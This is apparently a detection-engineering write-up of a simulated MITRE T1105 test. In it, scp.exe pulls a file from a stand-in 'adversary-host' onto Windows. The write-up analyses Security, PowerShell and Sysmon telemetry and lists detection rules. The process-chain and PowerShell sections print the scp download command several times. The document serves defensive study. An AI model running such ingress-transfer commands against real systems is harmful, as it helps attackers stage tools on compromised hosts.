# T1105-35: Ingress Tool Transfer — Windows pull file using scp.exe

## Technique Context

T1105 Ingress Tool Transfer is a fundamental command-and-control technique where adversaries transfer tools or files from an external system into a compromised environment. The use of scp.exe represents a particularly interesting variation — leveraging a legitimate administrative tool (OpenSSH's secure copy) that's now included by default in Windows 10/11. This makes detection more challenging since scp.exe usage may be legitimate in enterprise environments.

Detection engineers focus on several key aspects: unusual process chains involving scp.exe, command-line arguments revealing suspicious sources or destinations, network connections to unexpected external hosts, and file transfers to unusual locations. The technique is significant because it often precedes other attack phases — once initial tools are transferred, adversaries can establish persistence, escalate privileges, or deploy additional payloads.

## What This Dataset Contains

This dataset captures a straightforward scp.exe file transfer execution. The core telemetry shows:

**Process Chain**: PowerShell spawns scp.exe with the command line `"C:\Windows\System32\OpenSSH\scp.exe" adversary@adversary-host:/tmp/T1105.txt C:\temp` (Security EID 4688). The scp.exe process then spawns ssh.exe with command line `"C:\Windows\System32\OpenSSH\ssh.exe" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp` (Security EID 4688).

**PowerShell Evidence**: The PowerShell script block logging captures the exact command: `{scp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp}` (PowerShell EID 4104).

**Process Termination**: Both ssh.exe and scp.exe exit with status 0xFF, indicating failure (Security EID 4689). This suggests the transfer attempt was unsuccessful, likely due to network connectivity issues with the test environment.

**Sysmon Process Creation**: Despite using scp.exe, there's no Sysmon EID 1 for the scp.exe process creation, confirming the include-mode filtering in sysmon-modular — scp.exe isn't considered suspicious enough to trigger process creation logging. However, Sysmon does capture process access events (EID 10) showing PowerShell accessing scp.exe.

**Named Pipes**: Sysmon EID 17 shows scp.exe creating W32PosixPipe named pipes, which is expected behavior for POSIX-style process communication.

## What This Dataset Does Not Contain

The dataset lacks several important elements due to the failed transfer:

**Network Activity**: No Sysmon EID 3 (NetworkConnect) events are present, likely because the connection to "adversary-host" failed before establishing a network session. In a successful transfer, we would expect to see outbound connections to port 22 (SSH).

**File Creation Evidence**: No file creation events for the destination file `C:\temp\T1105.txt` since the transfer failed. Successful transfers would show Sysmon EID 11 events for the downloaded file.

**DNS Resolution**: No Sysmon EID 22 events for DNS queries attempting to resolve "adversary-host", suggesting the name resolution failed immediately.

**Authentication Events**: No Security EID 4624/4625 events related to SSH authentication attempts, confirming the connection never progressed to the authentication phase.

The 0xFF exit codes for both ssh.exe and scp.exe processes indicate the transfer was blocked at the network level, preventing observation of the complete attack chain.

## Assessment

This dataset provides excellent evidence for detecting scp.exe usage patterns in command-line arguments and process relationships, but limited network-level telemetry due to the failed connection. The Security channel's process creation events with full command-line logging provide the most valuable detection content, clearly showing the external host and file path details.

The combination of PowerShell script block logging and Security audit events creates strong detection opportunities even when network connections fail. The absence of Sysmon process creation for scp.exe highlights the importance of Security EID 4688 for comprehensive process monitoring, especially for tools that may not be flagged as suspicious by filtered Sysmon configurations.

For building robust detections, this data demonstrates how legitimate administrative tools can be abused and emphasizes the value of command-line analysis over simple process name detection.

## Detection Opportunities Present in This Data

1. **SCP External Host Detection**: Monitor Security EID 4688 for scp.exe processes with command lines containing external hostnames or IP addresses not in organizational IP ranges.

2. **PowerShell SCP Invocation**: Detect PowerShell EID 4104 script blocks containing "scp.exe" with external host patterns or unusual file paths.

3. **SSH/SCP Process Chain**: Alert on ssh.exe spawned by scp.exe processes, especially when combined with external host indicators in command lines.

4. **Unusual SCP Destination Paths**: Monitor for scp.exe transferring files to common staging directories like C:\temp, C:\ProgramData, or user profile temp folders.

5. **SCP Process Failure Analysis**: Track scp.exe and ssh.exe processes with non-zero exit codes (like 0xFF) which may indicate failed but attempted data transfers.

6. **PowerShell Process Access to Network Tools**: Monitor Sysmon EID 10 showing PowerShell accessing network transfer tools like scp.exe, especially with high-privilege access rights (0x1FFFFF).

7. **W32PosixPipe Creation by Network Tools**: Track Sysmon EID 17 pipe creation events from scp.exe, which could indicate file transfer preparation even if the transfer ultimately fails.
